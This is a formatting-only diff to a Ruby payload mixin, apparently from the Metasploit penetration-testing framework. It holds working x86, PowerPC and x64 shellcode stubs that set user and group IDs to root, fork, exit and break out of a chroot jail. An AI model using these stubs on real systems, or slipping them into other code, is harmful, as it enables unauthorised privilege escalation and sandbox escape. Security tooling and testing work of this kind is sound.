@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 # -*- coding: binary -*-
 require 'msf/core'
 
@@ -9,7 +10,6 @@ require 'msf/core'
 #
 ###
 module Msf::Payload::Linux
-
   #
   # This mixin is chained within payloads that target the Linux platform.
   # It provides special prepends, to support things like chroot and setuid.
@@ -20,69 +20,61 @@ module Msf::Payload::Linux
     register_advanced_options(
       [
         Msf::OptBool.new('PrependFork',
-          [
-            false,
-            "Prepend a stub that executes: if (fork()) { exit(0); }",
-            "false"
-          ]
-        ),
+                         [
+                           false,
+                           "Prepend a stub that executes: if (fork()) { exit(0); }",
+                           "false"
+                         ]),
         Msf::OptBool.new('PrependSetresuid',
-          [
-            false,
-            "Prepend a stub that executes the setresuid(0, 0, 0) system call",
-            "false"
-          ]
-        ),
+                         [
+                           false,
+                           "Prepend a stub that executes the setresuid(0, 0, 0) system call",
+                           "false"
+                         ]),
         Msf::OptBool.new('PrependSetreuid',
-          [
-            false,
-            "Prepend a stub that executes the setreuid(0, 0) system call",
-            "false"
-          ]
-        ),
+                         [
+                           false,
+                           "Prepend a stub that executes the setreuid(0, 0) system call",
+                           "false"
+                         ]),
         Msf::OptBool.new('PrependSetuid',
-          [
-            false,
-            "Prepend a stub that executes the setuid(0) system call",
-            "false"
-          ]
-        ),
+                         [
+                           false,
+                           "Prepend a stub that executes the setuid(0) system call",
+                           "false"
+                         ]),
         Msf::OptBool.new('PrependSetresgid',
-          [
-            false,
-            "Prepend a stub that executes the setresgid(0, 0, 0) system call",
-            "false"
-          ]
-        ),
+                         [
+                           false,
+                           "Prepend a stub that executes the setresgid(0, 0, 0) system call",
+                           "false"
+                         ]),
         Msf::OptBool.new('PrependSetregid',
-          [
-            false,
-            "Prepend a stub that executes the setregid(0, 0) system call",
-            "false"
-          ]
-        ),
+                         [
+                           false,
+                           "Prepend a stub that executes the setregid(0, 0) system call",
+                           "false"
+                         ]),
         Msf::OptBool.new('PrependSetgid',
-          [
-            false,
-            "Prepend a stub that executes the setgid(0) system call",
-            "false"
-          ]
-        ),
+                         [
+                           false,
+                           "Prepend a stub that executes the setgid(0) system call",
+                           "false"
+                         ]),
         Msf::OptBool.new('PrependChrootBreak',
-          [
-            false,
-            "Prepend a stub that will break out of a chroot (includes setreuid to root)",
-            "false"
-          ]
-        ),
+                         [
+                           false,
+                           "Prepend a stub that will break out of a chroot (includes setreuid to root)",
+                           "false"
+                         ]),
         Msf::OptBool.new('AppendExit',
-          [
-            false,
-            "Append a stub that executes the exit(0) system call",
-            "false"
-          ]
-        ),
-      ], Msf::Payload::Linux)
+                         [
+                           false,
+                           "Append a stub that executes the exit(0) system call",
+                           "false"
+                         ])
+      ], Msf::Payload::Linux
+    )
 
     ret
   end
@@ -91,206 +83,206 @@ module Msf::Payload::Linux
     pre = ''
     app = ''
 
-    test_arch = [ *(self.arch) ]
+    test_arch = [ *arch ]
 
     # Handle all x86 code here
-    if (test_arch.include?(ARCH_X86))
+    if test_arch.include?(ARCH_X86)
 
       # Prepend
 
-      if (datastore['PrependFork'])
-        pre << "\x6a\x02"             +#   pushb   $0x2                       #
-               "\x58"                 +#   popl    %eax                       #
-               "\xcd\x80"             +#   int     $0x80       ; fork         #
-               "\x85\xc0"             +#   test    %eax,%eax                  #
-               "\x74\x06"             +#   jz      0xf                        #
-               "\x31\xc0"             +#   xor     %eax,%eax                  #
-               "\xb0\x01"             +#   movb    $0x1,%al    ; exit         #
-               "\xcd\x80"              #   int     $0x80                      #
+      if datastore['PrependFork']
+        pre << "\x6a\x02" + #   pushb   $0x2                       #
+               "\x58" + #   popl    %eax                       #
+               "\xcd\x80" +  #   int     $0x80       ; fork         #
+               "\x85\xc0" +  #   test    %eax,%eax                  #
+               "\x74\x06" +  #   jz      0xf                        #
+               "\x31\xc0" +  #   xor     %eax,%eax                  #
+               "\xb0\x01" +  #   movb    $0x1,%al    ; exit         #
+               "\xcd\x80" #   int     $0x80                      #
       end
 
-      if (datastore['PrependSetresuid'])
+      if datastore['PrependSetresuid']
         # setresuid(0, 0, 0)
-        pre << "\x31\xc9"             +#   xorl    %ecx,%ecx                  #
-               "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
-               "\xf7\xe3"             +#   mull    %ebx                       #
-               "\xb0\xa4"             +#   movb    $0xa4,%al                  #
-               "\xcd\x80"              #   int     $0x80                      #
+        pre << "\x31\xc9" +  #   xorl    %ecx,%ecx                  #
+               "\x31\xdb" +  #   xorl    %ebx,%ebx                  #
+               "\xf7\xe3" +  #   mull    %ebx                       #
+               "\xb0\xa4" +  #   movb    $0xa4,%al                  #
+               "\xcd\x80" #   int     $0x80                      #
       end
 
-      if (datastore['PrependSetreuid'])
+      if datastore['PrependSetreuid']
         # setreuid(0, 0)
-        pre << "\x31\xc9"             +#   xorl    %ecx,%ecx                  #
-               "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
-               "\x6a\x46"             +#   pushl   $0x46                      #
-               "\x58"                 +#   popl    %eax                       #
-               "\xcd\x80"              #   int     $0x80                      #
+        pre << "\x31\xc9" +  #   xorl    %ecx,%ecx                  #
+               "\x31\xdb" +  #   xorl    %ebx,%ebx                  #
+               "\x6a\x46" +  #   pushl   $0x46                      #
+               "\x58" + #   popl    %eax                       #
+               "\xcd\x80" #   int     $0x80                      #
       end
 
-      if (datastore['PrependSetuid'])
+      if datastore['PrependSetuid']
         # setuid(0)
-        pre << "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
-               "\x6a\x17"             +#   pushl   $0x17                      #
-               "\x58"                 +#   popl    %eax                       #
-               "\xcd\x80"              #   int     $0x80                      #
+        pre << "\x31\xdb" +  #   xorl    %ebx,%ebx                  #
+               "\x6a\x17" +  #   pushl   $0x17                      #
+               "\x58" + #   popl    %eax                       #
+               "\xcd\x80" #   int     $0x80                      #
       end
 
-      if (datastore['PrependSetresgid'])
+      if datastore['PrependSetresgid']
         # setresgid(0, 0, 0)
-        pre << "\x31\xc9"             +#   xorl    %ecx,%ecx                  #
-               "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
-               "\xf7\xe3"             +#   mull    %ebx                       #
-               "\xb0\xaa"             +#   movb    $0xaa,%al                  #
-               "\xcd\x80"              #   int     $0x80                      #
+        pre << "\x31\xc9" +  #   xorl    %ecx,%ecx                  #
+               "\x31\xdb" +  #   xorl    %ebx,%ebx                  #
+               "\xf7\xe3" +  #   mull    %ebx                       #
+               "\xb0\xaa" +  #   movb    $0xaa,%al                  #
+               "\xcd\x80" #   int     $0x80                      #
       end
 
-      if (datastore['PrependSetregid'])
+      if datastore['PrependSetregid']
         # setregid(0, 0)
-        pre << "\x31\xc9"             +#   xorl    %ecx,%ecx                  #
-               "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
-               "\x6a\x47"             +#   pushl   $0x47                      #
-               "\x58"                 +#   popl    %eax                       #
-               "\xcd\x80"              #   int     $0x80                      #
+        pre << "\x31\xc9" +  #   xorl    %ecx,%ecx                  #
+               "\x31\xdb" +  #   xorl    %ebx,%ebx                  #
+               "\x6a\x47" +  #   pushl   $0x47                      #
+               "\x58" + #   popl    %eax                       #
+               "\xcd\x80" #   int     $0x80                      #
       end
 
-      if (datastore['PrependSetgid'])
+      if datastore['PrependSetgid']
         # setgid(0)
-        pre << "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
-               "\x6a\x2e"             +#   pushl   $0x2e                      #
-               "\x58"                 +#   popl    %eax                       #
-               "\xcd\x80"              #   int     $0x80                      #
+        pre << "\x31\xdb" +  #   xorl    %ebx,%ebx                  #
+               "\x6a\x2e" +  #   pushl   $0x2e                      #
+               "\x58" + #   popl    %eax                       #
+               "\xcd\x80" #   int     $0x80                      #
       end
-      if (datastore['PrependChrootBreak'])
+      if datastore['PrependChrootBreak']
         # setreuid(0, 0)
-        pre << "\x31\xc9"             +#   xorl    %ecx,%ecx                  #
-               "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
-               "\x6a\x46"             +#   pushl   $0x46                      #
-               "\x58"                 +#   popl    %eax                       #
-               "\xcd\x80"              #   int     $0x80                      #
+        pre << "\x31\xc9" +  #   xorl    %ecx,%ecx                  #
+               "\x31\xdb" +  #   xorl    %ebx,%ebx                  #
+               "\x6a\x46" +  #   pushl   $0x46                      #
+               "\x58" + #   popl    %eax                       #
+               "\xcd\x80" #   int     $0x80                      #
 
         # break chroot
-        pre << "\x6a\x3d"             +#   pushl  $0x3d                       #
-             # build dir str (ptr in ebx)
-             "\x89\xe3"             +#   movl   %esp,%ebx                   #
-             # mkdir(dir)
-             "\x6a\x27"             +#   pushl  $0x27                       #
-             "\x58"                 +#   popl   %eax                        #
-             "\xcd\x80"             +#   int     $0x80                      #
-             # chroot(dir)
-             "\x89\xd9"             +#   movl   %ebx,%ecx                   #
-             "\x58"                 +#   popl   %eax                        #
-             "\xcd\x80"             +#   int     $0x80                      #
-             # build ".." str (ptr in ebx)
-             "\x31\xc0"             +#   xorl   %eax,%eax                   #
-             "\x50"                 +#   pushl  %eax                        #
+        pre << "\x6a\x3d" + #   pushl  $0x3d                       #
+               # build dir str (ptr in ebx)
+               "\x89\xe3" + #   movl   %esp,%ebx                   #
+               # mkdir(dir)
+               "\x6a\x27" + #   pushl  $0x27                       #
+               "\x58" + #   popl   %eax                        #
+               "\xcd\x80" + #   int     $0x80                      #
+               # chroot(dir)
+               "\x89\xd9" + #   movl   %ebx,%ecx                   #
+               "\x58" + #   popl   %eax                        #
+               "\xcd\x80" + #   int     $0x80                      #
+               # build ".." str (ptr in ebx)
+               "\x31\xc0" + #   xorl   %eax,%eax                   #
+               "\x50" + #   pushl  %eax                        #
 
-             "\x66\x68\x2e\x2e"     +#   pushw  $0x2e2e                     #
-             "\x89\xe3"             +#   movl   %esp,%ebx                   #
-             # loop changing dir
-             "\x6a\x3d"             +#   pushl  $0x1e                       #
-             "\x59"                 +#   popl   %ecx                        #
-             "\xb0\x0c"             +#   movb   $0xc,%al                    #
-             "\xcd\x80"             +#   int     $0x80                      #
-             "\xe2\xfa"             +#   loop   -6                          #
-             # final chroot
-             "\x6a\x3d"             +#   pushl  $0x3d                       #
-             "\x89\xd9"             +#   movl   %ebx,%ecx                   #
-             "\x58"                 +#   popl   %eax                        #
-             "\xcd\x80"              #   int     $0x80                      #
+               "\x66\x68\x2e\x2e" + #   pushw  $0x2e2e                     #
+               "\x89\xe3" + #   movl   %esp,%ebx                   #
+               # loop changing dir
+               "\x6a\x3d" + #   pushl  $0x1e                       #
+               "\x59" + #   popl   %ecx                        #
+               "\xb0\x0c" +  #   movb   $0xc,%al                    #
+               "\xcd\x80" +  #   int     $0x80                      #
+               "\xe2\xfa" +  #   loop   -6                          #
+               # final chroot
+               "\x6a\x3d" +  #   pushl  $0x3d                       #
+               "\x89\xd9" +  #   movl   %ebx,%ecx                   #
+               "\x58" + #   popl   %eax                        #
+               "\xcd\x80" #   int     $0x80                      #
 
       end
 
       # Append exit(0)
 
-      if (datastore['AppendExit'])
-        app << "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
-          "\x6a\x01"             +#   pushl   $0x01                      #
-          "\x58"                 +#   popl    %eax                       #
-          "\xcd\x80"              #   int     $0x80                      #
+      if datastore['AppendExit']
+        app << "\x31\xdb" +  #   xorl    %ebx,%ebx                  #
+               "\x6a\x01" +  #   pushl   $0x01                      #
+               "\x58" + #   popl    %eax                       #
+               "\xcd\x80" #   int     $0x80                      #
       end
 
     # Handle all Power/CBEA code here
-    elsif (test_arch.include?([ ARCH_PPC, ARCH_PPC64, ARCH_CBEA, ARCH_CBEA64 ]))
+    elsif test_arch.include?([ ARCH_PPC, ARCH_PPC64, ARCH_CBEA, ARCH_CBEA64 ])
 
       # Prepend
 
-      if (datastore['PrependSetresuid'])
+      if datastore['PrependSetresuid']
         # setresuid(0, 0, 0)
-        pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
-               "\x7c\xa5\x2a\x78"     +#   xor     r5,r5,r5                   #
-               "\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
-               "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
-               "\x38\x1f\xfe\xa5"     +#   addi    r0,r31,-347                #
-               "\x44\xff\xff\x02"      #   sc                                 #
+        pre << "\x3b\xe0\x01\xff" +  #   li      r31,511                    #
+               "\x7c\xa5\x2a\x78" +  #   xor     r5,r5,r5                   #
+               "\x7c\x84\x22\x78" +  #   xor     r4,r4,r4                   #
+               "\x7c\x63\x1a\x78" +  #   xor     r3,r3,r3                   #
+               "\x38\x1f\xfe\xa5" +  #   addi    r0,r31,-347                #
+               "\x44\xff\xff\x02" #   sc                                 #
       end
 
-      if (datastore['PrependSetreuid'])
+      if datastore['PrependSetreuid']
         # setreuid(0, 0)
-        pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
-               "\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
-               "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
-               "\x38\x1f\xfe\x47"     +#   addi    r0,r31,-441                #
-               "\x44\xff\xff\x02"      #   sc                                 #
+        pre << "\x3b\xe0\x01\xff" +  #   li      r31,511                    #
+               "\x7c\x84\x22\x78" +  #   xor     r4,r4,r4                   #
+               "\x7c\x63\x1a\x78" +  #   xor     r3,r3,r3                   #
+               "\x38\x1f\xfe\x47" +  #   addi    r0,r31,-441                #
+               "\x44\xff\xff\x02" #   sc                                 #
       end
 
-      if (datastore['PrependSetuid'])
+      if datastore['PrependSetuid']
         # setuid(0)
-        pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
-               "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
-               "\x38\x1f\xfe\x18"     +#   addi    r0,r31,-488                #
-               "\x44\xff\xff\x02"      #   sc                                 #
+        pre << "\x3b\xe0\x01\xff" +  #   li      r31,511                    #
+               "\x7c\x63\x1a\x78" +  #   xor     r3,r3,r3                   #
+               "\x38\x1f\xfe\x18" +  #   addi    r0,r31,-488                #
+               "\x44\xff\xff\x02" #   sc                                 #
       end
 
-      if (datastore['PrependSetresgid'])
+      if datastore['PrependSetresgid']
         # setresgid(0, 0, 0)
-        pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
-               "\x7c\xa5\x2a\x78"     +#   xor     r5,r5,r5                   #
-               "\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
-               "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
-               "\x38\x1f\xfe\xab"     +#   addi    r0,r31,-341                #
-               "\x44\xff\xff\x02"      #   sc                                 #
+        pre << "\x3b\xe0\x01\xff" +  #   li      r31,511                    #
+               "\x7c\xa5\x2a\x78" +  #   xor     r5,r5,r5                   #
+               "\x7c\x84\x22\x78" +  #   xor     r4,r4,r4                   #
+               "\x7c\x63\x1a\x78" +  #   xor     r3,r3,r3                   #
+               "\x38\x1f\xfe\xab" +  #   addi    r0,r31,-341                #
+               "\x44\xff\xff\x02" #   sc                                 #
       end
 
-      if (datastore['PrependSetregid'])
+      if datastore['PrependSetregid']
         # setregid(0, 0)
-        pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
-               "\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
-               "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
-               "\x38\x1f\xfe\x48"     +#   addi    r0,r31,-440                #
-               "\x44\xff\xff\x02"      #   sc                                 #
+        pre << "\x3b\xe0\x01\xff" +  #   li      r31,511                    #
+               "\x7c\x84\x22\x78" +  #   xor     r4,r4,r4                   #
+               "\x7c\x63\x1a\x78" +  #   xor     r3,r3,r3                   #
+               "\x38\x1f\xfe\x48" +  #   addi    r0,r31,-440                #
+               "\x44\xff\xff\x02" #   sc                                 #
       end
 
-      if (datastore['PrependSetgid'])
+      if datastore['PrependSetgid']
         # setgid(0)
-        pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
-               "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
-               "\x38\x1f\xfe\x2f"     +#   addi    r0,r31,-465                #
-               "\x44\xff\xff\x02"      #   sc                                 #
+        pre << "\x3b\xe0\x01\xff" +  #   li      r31,511                    #
+               "\x7c\x63\x1a\x78" +  #   xor     r3,r3,r3                   #
+               "\x38\x1f\xfe\x2f" +  #   addi    r0,r31,-465                #
+               "\x44\xff\xff\x02" #   sc                                 #
       end
 
-      if (datastore['PrependChrootBreak'])
+      if datastore['PrependChrootBreak']
         # setreuid(0, 0)
-        pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
-               "\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
-               "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
-               "\x38\x1f\xfe\x47"     +#   addi    r0,r31,-441                #
-               "\x44\xff\xff\x02"      #   sc                                 #
+        pre << "\x3b\xe0\x01\xff" +  #   li      r31,511                    #
+               "\x7c\x84\x22\x78" +  #   xor     r4,r4,r4                   #
+               "\x7c\x63\x1a\x78" +  #   xor     r3,r3,r3                   #
+               "\x38\x1f\xfe\x47" +  #   addi    r0,r31,-441                #
+               "\x44\xff\xff\x02" #   sc                                 #
 
         # EEK! unsupported...
       end
 
       # Append exit(0)
 
-      if (datastore['AppendExit'])
-        app << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
-               "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
-               "\x38\x1f\xfe\x02"     +#   addi    r0,r31,-510                #
-               "\x44\xff\xff\x02"      #   sc                                 #
+      if datastore['AppendExit']
+        app << "\x3b\xe0\x01\xff" +  #   li      r31,511                    #
+               "\x7c\x63\x1a\x78" +  #   xor     r3,r3,r3                   #
+               "\x38\x1f\xfe\x02" +  #   addi    r0,r31,-510                #
+               "\x44\xff\xff\x02" #   sc                                 #
       end
 
-    elsif (test_arch.include?(ARCH_X64))
+    elsif test_arch.include?(ARCH_X64)
 
-      if (datastore['PrependFork'])
+      if datastore['PrependFork']
         # if (fork()) { exit(0); }
         pre << "\x6a\x39"             #    push    57        ; __NR_fork     #
         pre << "\x58"                 #    pop     rax                       #
@@ -303,7 +295,7 @@ module Msf::Payload::Linux
         pre << "\x0f\x05"             #    syscall                           #
       end
 
-      if (datastore['PrependSetresuid'])
+      if datastore['PrependSetresuid']
         # setresuid(0, 0, 0)
         pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
         pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
@@ -312,7 +304,7 @@ module Msf::Payload::Linux
         pre << "\x0f\x05"             #    syscall                           #
       end
 
-      if (datastore['PrependSetreuid'])
+      if datastore['PrependSetreuid']
         # setreuid(0, 0)
         pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
         pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
@@ -322,7 +314,7 @@ module Msf::Payload::Linux
         pre << "\x0f\x05"             #    syscall                           #
       end
 
-      if (datastore['PrependSetuid'])
+      if datastore['PrependSetuid']
         # setuid(0)
         pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
         pre << "\x6a\x69"             #    push    0x69                      #
@@ -330,7 +322,7 @@ module Msf::Payload::Linux
         pre << "\x0f\x05"             #    syscall                           #
       end
 
-      if (datastore['PrependSetresgid'])
+      if datastore['PrependSetresgid']
         # setresgid(0, 0, 0)
         pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
         pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
@@ -339,7 +331,7 @@ module Msf::Payload::Linux
         pre << "\x0f\x05"             #    syscall                           #
       end
 
-      if (datastore['PrependSetregid'])
+      if datastore['PrependSetregid']
         # setregid(0, 0)
         pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
         pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
@@ -349,7 +341,7 @@ module Msf::Payload::Linux
         pre << "\x0f\x05"             #    syscall                           #
       end
 
-      if (datastore['PrependSetgid'])
+      if datastore['PrependSetgid']
         # setgid(0)
         pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
         pre << "\x6a\x6a"             #    push    0x6a                      #
@@ -357,7 +349,7 @@ module Msf::Payload::Linux
         pre << "\x0f\x05"             #    syscall                           #
       end
 
-      if (datastore['PrependChrootBreak'])
+      if datastore['PrependChrootBreak']
 
         # setreuid(0, 0)
         pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
@@ -367,8 +359,8 @@ module Msf::Payload::Linux
         pre << "\x0f\x05"             #    syscall                           #
 
         # generate temp dir name
-        pre << "\x48\xbf"             #    mov     rdi,                      #
-        pre << Rex::Text.rand_text_alpha(8)  #         random                #
+        pre << "\x48\xbf" #    mov     rdi,                      #
+        pre << Rex::Text.rand_text_alpha(8) #         random                #
         pre << "\x56"                 #    push    rsi                       #
         pre << "\x57"                 #    push    rdi                       #
 
@@ -409,7 +401,7 @@ module Msf::Payload::Linux
       end
 
       # Append exit(0)
-      if (datastore['AppendExit'])
+      if datastore['AppendExit']
         app << "\x48\x31\xff"         #    xor     rdi,rdi                   #
         app << "\x6a\x3c"             #    push    0x3c                      #
         app << "\x58"                 #    pop     rax                       #
@@ -417,8 +409,6 @@ module Msf::Payload::Linux
       end
     end
 
-    return (pre + buf + app)
+    (pre + buf + app)
   end
-
-
 end
